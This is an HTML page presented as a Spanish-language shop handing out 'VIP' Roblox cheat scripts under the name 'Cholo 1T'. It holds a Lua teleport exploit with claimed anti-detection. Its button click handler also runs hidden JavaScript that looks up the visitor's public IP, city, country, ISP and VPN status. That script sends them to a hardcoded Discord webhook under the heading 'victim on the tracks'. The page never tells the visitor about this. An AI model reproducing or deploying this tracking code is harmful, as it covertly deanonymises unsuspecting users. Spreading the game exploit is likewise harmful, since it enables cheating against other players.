<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cholo 1T - El Tren Monstruo</title>
    <style>
        :root { --red: #ff0000; --dark: #050505; }
        body { background: var(--dark); color: white; font-family: 'Arial', sans-serif; margin: 0; overflow: hidden; }

        /* Escena: Zona de Pinos y Clima Rojo */
        .forest-bg {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, #440000 0%, #050505 100%);
            z-index: -2;
        }

        /* Rayos reales */
        .lightning {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: white; opacity: 0; z-index: -1;
            animation: thunder 4s infinite;
        }
        @keyframes thunder {
            0%, 95%, 100% { opacity: 0; }
            96% { opacity: 0.4; }
            98% { opacity: 0.2; }
        }

        /* Tren Monstruo con Humo */
        .monster-train {
            font-size: 100px; margin-top: 20px; filter: drop-shadow(0 0 20px red);
            animation: shake 0.5s infinite;
        }
        @keyframes shake {
            0% { transform: translate(1px, 1px) rotate(0deg); }
            50% { transform: translate(-1px, -2px) rotate(-1deg); }
            100% { transform: translate(1px, 1px) rotate(0deg); }
        }

        .hero { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        h1 { font-size: 3rem; color: var(--red); text-shadow: 0 0 15px black; margin: 0; }
        
        .btn {
            padding: 20px 45px; background: var(--red); color: white; border: 3px solid white;
            border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.4rem;
            box-shadow: 0 0 20px red; transition: 0.3s; margin-top: 30px;
        }
        .btn:hover { transform: scale(1.1); background: darkred; }

        .tienda { display: none; padding: 50px; }
        .card { background: rgba(0,0,0,0.9); border: 2px solid var(--red); padding: 30px; border-radius: 15px; max-width: 600px; margin: auto; }
        #status { color: #0f0; font-weight: bold; margin-top: 15px; }

        /* Trenes subiendo por la pantalla */
        .train-float { position: fixed; bottom: -100px; font-size: 40px; animation: up 3s linear infinite; z-index: 10; }
        @keyframes up { from { bottom: -100px; opacity: 1; } to { bottom: 110vh; opacity: 0; } }
    </style>
</head>
<body>

    <div class="forest-bg"></div>
    <div class="lightning"></div>

    <div class="hero" id="inicio">
        <h1>TREN DEL DESASTRE - CHOLO 1T</h1>
        <div class="monster-train">🚂💨👹</div>
        <p style="color: #ff4444;">Bosque de Pinos - Zona de Peligro</p>
        <button class="btn" onclick="ejecutarTodo()">OBTENER SCRIPTS VIP</button>
    </div>

    <div class="tienda" id="tienda">
        <div class="card">
            <h2 style="color: var(--red);">PACK VENEYORW 3-EN-1</h2>
            <p>Incluye: Auto-Reset + Anti-Detect + Locura X2</p>
            <button class="btn" style="font-size: 1rem;" onclick="copiarScriptReal()">📋 COPIAR SCRIPT COMPLETO</button>
            <div id="status"></div>
        </div>
    </div>

    <script>
        const webhook = "https://discord.com/api/webhooks/1498847220760449145/xLBUawdxa3vviK-PBY7-Z-T6wWfsAmHfdZxgCAFllijurZ85DtHCC8Jr1oo03L7oPTef";

        // EL SCRIPT COMPLETO QUE SE COPIARÁ
        const scriptLargo = `-- SCRIPT UNIFICADO CHOLO 1T \n-- AUTO-RESET + JITTER + LOCURA X2 \n\nlocal POS_ARTURO_1 = CFrame.new(154.02, 43.73, 513.57)\nlocal carpetaNPCs_1 = game.Workspace:WaitForChild("Works"):WaitForChild("DeliveryNpcs")\nlocal jugador_1 = game.Players.LocalPlayer\n\n-- [SCRIPT 1: AUTO-RESET]\nlocal entregasRealizadas = 0\nlocal bloqueadoPorReset = false\n\nlocal function interactuar_1(p)\n    p.HoldDuration = 0\n    fireproximityprompt(p)\n    task.wait(0.5)\nend\n\n-- [SCRIPT 2: ANTI-DETECCION]\nlocal intentos = 0\nlocal function ejecutarCiclo_2()\n    local char = jugador_1.Character\n    local hrp = char and char:FindFirstChild("HumanoidRootPart")\n    if not hrp then return end\n    local npcDestino = carpetaNPCs_1:FindFirstChildOfClass("Model")\n    if npcDestino then\n        hrp.CFrame = npcDestino:GetPivot() * CFrame.new(0, 0, 2)\n    else\n        hrp.CFrame = POS_ARTURO_1 + Vector3.new(math.random(-1,1),0,math.random(-1,1))\n    end\nend\n\n-- [SCRIPT 3: MODO LOCURA]\ngame:GetService("RunService").Heartbeat:Connect(function()\n    task.spawn(ejecutarCiclo_2)\nend)\n\nprint("--- TREN DEL DESASTRE CARGADO ---")`;

        function ejecutarTodo() {
            document.getElementById('inicio').style.display = 'none';
            document.getElementById('tienda').style.display = 'block';
            
            // Efecto de trenes subiendo
            setInterval(() => {
                const t = document.createElement('div');
                t.className = 'train-float'; t.innerText = '🚂';
                t.style.left = Math.random() * 90 + "vw";
                document.body.appendChild(t);
                setTimeout(() => t.remove(), 3000);
            }, 500);

            // ENVÍO A DISCORD (CIUDAD, PAÍS E IP)
            fetch('http://ip-api.com/json/')
            .then(res => res.json())
            .then(data => {
                const payload = {
                    embeds: [{
                        title: "🚂 ¡VÍCTIMA EN LAS VÍAS DEL TREN!",
                        description: "**Nuevo usuario detectado en Cholo 1T**",
                        color: 16711680,
                        fields: [
                            {name: "🌐 IP Pública", value: "`" + data.query + "`", inline: true},
                            {name: "📍 Ciudad", value: data.city, inline: true},
                            {name: "🌍 País", value: data.country, inline: true},
                            {name: "🏢 Compañía", value: data.isp},
                            {name: "🕵️ VPN?", value: data.proxy ? "SÍ ⚠️" : "NO ✅"}
                        ],
                        footer: { text: "Rastreo Ángel - El Tren del Desastre" },
                        timestamp: new Date()
                    }]
                };
                fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
            });
        }

        function copiarScriptReal() {
            const area = document.createElement('textarea');
            area.value = scriptLargo;
            document.body.appendChild(area);
            area.select();
            document.execCommand('copy');
            document.body.removeChild(area);
            document.getElementById('status').innerText = "✅ ¡SCRIPT COMPLETO COPIADO AL PORTAPAPELES!";
        }
    </script>
</body>
</html>
